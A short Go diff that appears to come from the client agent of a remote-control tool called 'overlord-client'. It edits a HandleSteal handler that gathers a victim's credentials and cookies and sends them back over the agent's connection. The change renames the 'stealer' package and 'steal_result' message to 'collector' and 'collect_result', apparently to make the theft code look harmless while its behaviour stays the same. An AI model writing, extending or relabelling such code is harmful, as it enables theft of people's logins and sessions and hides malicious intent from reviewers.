@@ -7,11 +7,11 @@ import (
 
 	rt "overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/wire"
-	"overlord-client/internal/stealer"
+	"overlord-client/internal/collector"
 )
 
 func HandleSteal(ctx context.Context, env *rt.Env, cmdID string, envelope map[string]interface{}) error {
-	r := stealer.Run()
+	r := collector.Run()
 
 	creds := make([]wire.StealCredential, 0, len(r.Credentials))
 	for _, c := range r.Credentials {
@@ -69,7 +69,7 @@ func HandleSteal(ctx context.Context, env *rt.Env, cmdID string, envelope map[st
 	}
 
 	return wire.WriteMsg(ctx, env.Conn, wire.StealResult{
-		Type:        "steal_result",
+		Type:        "collect_result",
 		CommandID:   cmdID,
 		Credentials: creds,
 		Cookies:     cookies,
